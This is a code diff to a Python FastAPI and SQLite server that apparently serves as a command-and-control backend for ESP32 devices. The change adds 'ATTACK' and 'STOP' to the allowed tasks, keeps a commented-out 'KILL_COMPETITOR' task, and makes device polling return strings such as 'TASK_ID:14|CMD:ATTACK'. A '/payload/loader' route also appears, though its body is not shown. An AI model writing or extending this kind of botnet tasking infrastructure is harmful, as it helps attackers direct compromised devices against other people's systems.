@@ -40,7 +40,7 @@ def get_con():
     con.execute("PRAGMA journal_mode=WAL")  # safe for multi-process shared DB
     return con
 
-'''
+
 def db_init():
     con = get_con()
     con.executescript("""
@@ -128,16 +128,16 @@ class ResultPayload(BaseModel):
 
 
 # VALID_TASKS = {"PING", "SLEEP", "BENCHMARK", "KILL_COMPETITOR"}
-VALID_TASKS = {"PING", "SLEEP"}  # later implement the rest
+VALID_TASKS = {"PING", "SLEEP", "ATTACK", "STOP"}  # later implement the rest
 
 class AddPayload(BaseModel):
     device_id: str
-    task: str '''
+    task: str
 
-# ─────────────────────────────────────────
+# ────────────────────────────────────────
 # Routes
 # ─────────────────────────────────────────
-'''
+
 
 @app.post("/add", status_code=204)
 def add_task(payload: AddPayload):
@@ -193,19 +193,25 @@ def get_tasks(device_id: str):
 
     if not rows:
         con.close()
-        return []
+        return "CLEAR"
 
-    ids = [r["id"] for r in rows]
-    placeholders = ",".join("?" * len(ids))
+    # Grab the single oldest pending task from the list
+    first_task = rows[0]
+    task_id = first_task["id"]
+    task_name = first_task["task"]
+
+    # Update its status in the SQLite DB to 'dispatched' using its unique ID
     con.execute(
-        f"UPDATE tasks SET status = 'dispatched' WHERE id IN ({placeholders})",
-        ids
+        "UPDATE tasks SET status = 'dispatched' WHERE id = ?",
+        (task_id,)
     )
     con.commit()
     con.close()
 
-    return [{"task_id": r["id"], "task": r["task"]} for r in rows]
-'''
+    # Return the clean text format that the ESP32's .indexOf() parser expects
+    # Example output sent over Wi-Fi: "TASK_ID:14|CMD:ATTACK"
+    return f"TASK_ID:{task_id}|CMD:{task_name}"
+
 
 @app.get("/payload/loader")
 def get_payload(device_id: str):
